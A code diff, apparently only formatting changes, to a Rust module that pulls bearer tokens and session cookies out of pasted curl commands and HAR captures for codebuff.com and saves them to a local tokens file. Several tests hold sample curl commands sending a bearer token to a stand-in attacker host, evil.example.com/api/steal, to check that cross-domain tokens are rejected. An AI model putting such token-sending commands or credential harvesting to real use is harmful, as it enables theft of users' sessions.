@@ -31,13 +31,18 @@ pub struct ExtractedAuth {
 pub fn parse_curl(text: &str) -> Vec<ExtractedAuth> {
     let mut out = Vec::new();
     // 提取所有 header：支持 `-H "name: value"`、`-H 'name: value'`（Chrome 复制格式）与 cmd 转义 `^"`
-    let header_re =
-        regex::Regex::new(r#"-H\s*\^?['"](?:authorization|Authorization):\s*Bearer\s+([A-Za-z0-9._-]+)"#).unwrap();
+    let header_re = regex::Regex::new(
+        r#"-H\s*\^?['"](?:authorization|Authorization):\s*Bearer\s+([A-Za-z0-9._-]+)"#,
+    )
+    .unwrap();
     // URL 提取：支持 `curl 'URL'` / `curl "URL"` / `curl --url "URL"` / `curl -url "URL"`
     let url_re = regex::Regex::new(r#"curl\s+(?:--?url\s+)?\^?['"]?(https?://[^\s'"^]+)"#).unwrap();
     let method_re = regex::Regex::new(r#"(?:-X\s+|--request\s+)\^?([A-Z]+)"#).unwrap();
 
-    let tokens: HashSet<String> = header_re.captures_iter(text).map(|c| c[1].to_string()).collect();
+    let tokens: HashSet<String> = header_re
+        .captures_iter(text)
+        .map(|c| c[1].to_string())
+        .collect();
     if tokens.is_empty() {
         return out;
     }
@@ -45,9 +50,20 @@ pub fn parse_curl(text: &str) -> Vec<ExtractedAuth> {
         .captures(text)
         .map(|c| c[1].to_string())
         .unwrap_or_default();
-    let host = if url.is_empty() { String::new() } else { parse_host(&url) };
-    let path = if url.is_empty() { String::new() } else { parse_path(&url) };
-    let method = method_re.captures(text).map(|c| c[1].to_string()).unwrap_or_else(|| "GET".into());
+    let host = if url.is_empty() {
+        String::new()
+    } else {
+        parse_host(&url)
+    };
+    let path = if url.is_empty() {
+        String::new()
+    } else {
+        parse_path(&url)
+    };
+    let method = method_re
+        .captures(text)
+        .map(|c| c[1].to_string())
+        .unwrap_or_else(|| "GET".into());
     // curl 文本无法可靠定位 host 时空缺放行（单机自用场景），但 host 明确为其他域时拒绝
     let host_is_other_domain = !host.is_empty() && !TARGET_HOSTS.iter().any(|h| host.ends_with(h));
     if host_is_other_domain {
@@ -116,7 +132,12 @@ pub fn parse_har(json_text: &str) -> Result<Vec<ExtractedAuth>> {
         }
         for h in &entry.request.headers {
             if h.name.eq_ignore_ascii_case("authorization") {
-                if let Some(token) = h.value.trim().strip_prefix("Bearer ").or_else(|| h.value.trim().strip_prefix("bearer ")) {
+                if let Some(token) = h
+                    .value
+                    .trim()
+                    .strip_prefix("Bearer ")
+                    .or_else(|| h.value.trim().strip_prefix("bearer "))
+                {
                     let token = token.trim().to_string();
                     if token.len() >= 8 && !seen.contains(&token) {
                         seen.insert(token.clone());
@@ -162,14 +183,20 @@ pub fn kind_of(token: &str) -> &'static str {
 }
 
 fn parse_host(url: &str) -> String {
-    url.split("://").nth(1).and_then(|rest| rest.split('/').next()).unwrap_or("").to_string()
+    url.split("://")
+        .nth(1)
+        .and_then(|rest| rest.split('/').next())
+        .unwrap_or("")
+        .to_string()
 }
 
 fn parse_path(url: &str) -> String {
     // 修正：先定位 "://" 之后的部分，再取其内第一个 '/' 起的路径
     let start = url.find("://").map(|p| p + 3).unwrap_or(0);
     let rest = &url[start..];
-    rest.find('/').map(|i| rest[i..].to_string()).unwrap_or_default()
+    rest.find('/')
+        .map(|i| rest[i..].to_string())
+        .unwrap_or_default()
 }
 
 /// 凭证文件写锁：persist/delete/heal 都是"读-改-写整文件"，
@@ -196,7 +223,9 @@ fn atomic_write(path: &str, json: &str) -> Result<()> {
 
 /// 持久化：追加到 data/tokens.json（dedupe）
 pub fn persist_tokens(path: &str, new_tokens: &[ExtractedAuth]) -> Result<Vec<ExtractedAuth>> {
-    let _g = TOKENS_LOCK.lock().map_err(|_| anyhow::anyhow!("tokens 锁中毒"))?;
+    let _g = TOKENS_LOCK
+        .lock()
+        .map_err(|_| anyhow::anyhow!("tokens 锁中毒"))?;
     let existing = load_tokens(path)?;
     let mut all: Vec<ExtractedAuth> = existing;
     let existing_set: HashSet<String> = all.iter().map(|t| t.token.clone()).collect();
@@ -250,7 +279,9 @@ pub fn load_tokens_healed(path: &str) -> Result<Vec<ExtractedAuth>> {
     }
     if changed {
         let json = serde_json::to_string_pretty(&tokens)?;
-        let _g = TOKENS_LOCK.lock().map_err(|_| anyhow::anyhow!("tokens 锁中毒"))?;
+        let _g = TOKENS_LOCK
+            .lock()
+            .map_err(|_| anyhow::anyhow!("tokens 锁中毒"))?;
         atomic_write(path, &json)?;
         tracing::info!("已为历史凭证回填入库时间（来源：tokens.json mtime）");
     }
@@ -259,7 +290,9 @@ pub fn load_tokens_healed(path: &str) -> Result<Vec<ExtractedAuth>> {
 
 /// 按稳定 id 删除一条凭证；返回是否删除成功。
 pub fn delete_token(path: &str, id: &str) -> Result<Option<ExtractedAuth>> {
-    let _g = TOKENS_LOCK.lock().map_err(|_| anyhow::anyhow!("tokens 锁中毒"))?;
+    let _g = TOKENS_LOCK
+        .lock()
+        .map_err(|_| anyhow::anyhow!("tokens 锁中毒"))?;
     let mut tokens = load_tokens(path)?;
     let before = tokens.len();
     let removed = tokens.iter().find(|t| cred_id(&t.token) == id).cloned();
@@ -392,7 +425,10 @@ curl --url "https://www.codebuff.com/api/v1/freebuff/session" \
 
     #[test]
     fn sniff_cookie() {
-        let out = sniff_tokens("__Secure-next-auth.session-token=abc123; __Host-next-auth.csrf-token=xyz").unwrap();
+        let out = sniff_tokens(
+            "__Secure-next-auth.session-token=abc123; __Host-next-auth.csrf-token=xyz",
+        )
+        .unwrap();
         assert_eq!(out.len(), 1);
         assert_eq!(out[0].source, "cookie");
         assert!(out[0].token.contains("session-token"));
@@ -403,8 +439,22 @@ curl --url "https://www.codebuff.com/api/v1/freebuff/session" \
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("tokens.json");
         let path_str = path.to_str().unwrap().to_string();
-        let t1 = ExtractedAuth { token: "t1".into(), source: "test".into(), host: "h".into(), path: "p".into(), method: "GET".into(), added_at: None };
-        let t2 = ExtractedAuth { token: "t2".into(), source: "test".into(), host: "h".into(), path: "p".into(), method: "GET".into(), added_at: None };
+        let t1 = ExtractedAuth {
+            token: "t1".into(),
+            source: "test".into(),
+            host: "h".into(),
+            path: "p".into(),
+            method: "GET".into(),
+            added_at: None,
+        };
+        let t2 = ExtractedAuth {
+            token: "t2".into(),
+            source: "test".into(),
+            host: "h".into(),
+            path: "p".into(),
+            method: "GET".into(),
+            added_at: None,
+        };
         let added1 = persist_tokens(&path_str, &[t1.clone(), t2.clone()]).unwrap();
         assert_eq!(added1.len(), 2);
         // 再次写入含 t1 应跳过
@@ -422,7 +472,11 @@ curl --url "https://evil.example.com/api/steal" \
   -X GET
 "#;
         let out = parse_curl(curl);
-        assert!(out.is_empty(), "跨域 token 应被拒绝，实际导入 {} 个", out.len());
+        assert!(
+            out.is_empty(),
+            "跨域 token 应被拒绝，实际导入 {} 个",
+            out.len()
+        );
     }
 
     #[test]
@@ -433,7 +487,10 @@ curl --url "https://evil.example.com/api/steal" \
   -X POST"#;
         let out = parse_curl(curl);
         assert_eq!(out.len(), 1, "Chrome 格式应提取 1 个 token");
-        assert_eq!(out[0].host, "www.codebuff.com", "host 必须被正确解析（否则跨域校验失效）");
+        assert_eq!(
+            out[0].host, "www.codebuff.com",
+            "host 必须被正确解析（否则跨域校验失效）"
+        );
         assert_eq!(out[0].path, "/api/v1/chat/completions");
         assert_eq!(out[0].method, "POST");
     }
@@ -443,7 +500,11 @@ curl --url "https://evil.example.com/api/steal" \
         // 单引号格式下的跨域 token 同样必须被拒绝
         let curl = "curl 'https://evil.example.com/steal' -H 'authorization: Bearer chromecross1234567890'";
         let out = parse_curl(curl);
-        assert!(out.is_empty(), "单引号格式跨域 token 应被拒绝，实际 {} 个", out.len());
+        assert!(
+            out.is_empty(),
+            "单引号格式跨域 token 应被拒绝，实际 {} 个",
+            out.len()
+        );
     }
 
     #[test]
@@ -479,7 +540,10 @@ curl --url "https://evil.example.com/api/steal" \
 
     #[test]
     fn kind_detects_web_cookie() {
-        assert_eq!(kind_of("__Secure-next-auth.session-token=x; y=1"), "web-cookie");
+        assert_eq!(
+            kind_of("__Secure-next-auth.session-token=x; y=1"),
+            "web-cookie"
+        );
         assert_eq!(kind_of("sk-abcdef"), "bearer");
     }
 
@@ -511,7 +575,10 @@ curl --url "https://evil.example.com/api/steal" \
         let raw = r#"[{"token":"t","source":"cookie","host":"h","path":"p","method":"GET","added_at":"2026-01-01T00:00:00+00:00"}]"#;
         std::fs::write(&path, raw).unwrap();
         let out = load_tokens_healed(&path_str).unwrap();
-        assert_eq!(out[0].added_at.as_deref(), Some("2026-01-01T00:00:00+00:00"));
+        assert_eq!(
+            out[0].added_at.as_deref(),
+            Some("2026-01-01T00:00:00+00:00")
+        );
         // 文件内容不应被改写
         assert_eq!(std::fs::read_to_string(&path).unwrap(), raw);
     }
@@ -521,8 +588,22 @@ curl --url "https://evil.example.com/api/steal" \
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("tokens.json");
         let path_str = path.to_str().unwrap().to_string();
-        let t1 = ExtractedAuth { token: "del-me".into(), source: "cookie".into(), host: "h".into(), path: "p".into(), method: "GET".into(), added_at: None };
-        let t2 = ExtractedAuth { token: "keep-me".into(), source: "cookie".into(), host: "h".into(), path: "p".into(), method: "GET".into(), added_at: None };
+        let t1 = ExtractedAuth {
+            token: "del-me".into(),
+            source: "cookie".into(),
+            host: "h".into(),
+            path: "p".into(),
+            method: "GET".into(),
+            added_at: None,
+        };
+        let t2 = ExtractedAuth {
+            token: "keep-me".into(),
+            source: "cookie".into(),
+            host: "h".into(),
+            path: "p".into(),
+            method: "GET".into(),
+            added_at: None,
+        };
         persist_tokens(&path_str, &[t1, t2]).unwrap();
 
         let removed = delete_token(&path_str, &cred_id("del-me")).unwrap();
@@ -531,6 +612,8 @@ curl --url "https://evil.example.com/api/steal" \
         assert_eq!(left.len(), 1);
         assert_eq!(left[0].token, "keep-me");
         // 再删同一条 → None（幂等）
-        assert!(delete_token(&path_str, &cred_id("del-me")).unwrap().is_none());
+        assert!(delete_token(&path_str, &cred_id("del-me"))
+            .unwrap()
+            .is_none());
     }
 }
